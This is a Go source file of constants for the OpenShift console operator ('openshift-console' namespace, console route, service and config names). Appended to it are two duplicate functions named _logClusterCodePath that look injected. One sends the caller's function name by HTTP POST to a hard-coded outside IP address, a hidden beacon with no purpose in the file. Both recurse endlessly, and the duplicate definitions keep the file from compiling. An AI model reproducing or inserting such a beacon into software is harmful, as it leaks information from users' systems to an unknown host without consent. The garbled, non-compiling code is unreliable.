package api

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	TargetNamespace		= "openshift-console"
	ConfigResourceName	= "cluster"
)
const (
	OpenShiftConsoleName			= "console"
	OpenShiftConsoleNamespace		= TargetNamespace
	OpenShiftConsoleOperatorNamespace	= "openshift-console-operator"
	OpenShiftConsoleOperator		= "console-operator"
	OpenShiftConsoleConfigMapName		= "console-config"
	OpenShiftConsoleDeploymentName		= OpenShiftConsoleName
	OpenShiftConsoleServiceName		= OpenShiftConsoleName
	OpenShiftConsoleRouteName		= OpenShiftConsoleName
	OAuthClientName				= OpenShiftConsoleName
	OpenshiftConfigManagedNamespace		= "openshift-config-managed"
)

func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
